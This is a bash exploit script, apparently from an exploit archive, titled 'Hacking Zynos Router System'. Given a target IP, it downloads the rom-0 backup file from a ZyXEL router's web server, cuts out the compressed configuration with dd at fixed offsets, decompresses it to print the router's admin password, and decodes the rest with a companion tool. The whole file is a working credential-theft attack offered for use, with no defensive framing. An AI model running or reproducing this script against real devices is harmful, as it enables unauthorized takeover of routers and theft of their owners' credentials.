#!/bin/bash


echo "#### 
# In The Name Of ALLAH
# Exploit Title: Hacking Zynos Router System
# Author: KinG Of PiraTeS
# Facebook Profile: www.fb.me/cr4ck3d
# E-mail: t5r@hotmail.com / cr4ck3d@offdr5cax.dz
# Web Site : www.1337day.com | www.inj3ct0rs.com
# Vendor: http://www.zyxel.com/
# Version: x.x.x
# Security Risk : High
# Tested on: [Windows 7 Edition Intégrale 64bit ] é [ Kali Linux ]
####"

echo " _   _             ____           __  __ 
| | | | ___  _   _/ ___| ___  ___|  \/  |
| |_| |/ _ \| | | \___ \/ __|/ _ \ |\/| |
|  _  | (_) | |_| |___) \__ \  __/ |  | |
|_| |_|\___/ \__,_|____/|___/\___|_|  |_|
                                         "


# Path to "exp"
exp=./exp;

gcc exp.c -o exp
gcc RomDecoder.c -o RomDecoder

if [ $# -lt 1 ]; then
    echo -ne "\e[1;31m[-] How To use: $0 <IP> \e[0m\n";
fi

ip=$1;
port=80;

if [ $# -eq 2 ]; then
    port=$2;

fi

echo -ne "\e[0;32m[+] Downloading rom-0...\e[0m\n";
rm -f /tmp/rom-0;
curl "http://${ip}:${port}/rom-0" -o /tmp/rom-0 2>/dev/null;

echo -ne "\e[0;32m[+] Getting The Pass...\e[0m\n";
# Extracting spt.dat
rm -f /tmp/spt.dat;
dd if=/tmp/rom-0 of=/tmp/spt.dat bs=1 skip=8552 count=39600 2>/dev/null;
# Extracting compressed Data
rm -f /tmp/data;
dd if=/tmp/spt.dat of=/tmp/data bs=1 count=220 skip=16 2>/dev/null;
# Décompressing data & Getting password
pass=`$exp /tmp/data | strings | head -n 1`;

echo -ne "\e[0;32m[+] Password Showed: \e[1;32m${pass}\e[0m\n";

./RomDecoder /tmp/rom-0

echo -ne "\e[0;32m[+] terminated }:) By KInG Of PiraTeS\e[0m\n";

echo " _  ___        ____ 
| |/ (_)_ __  / ___|
| ' /| | '_ \| |  _ 
| . \| | | | | |_| |
|_|\_\_|_| |_|\____|
                    "
                    

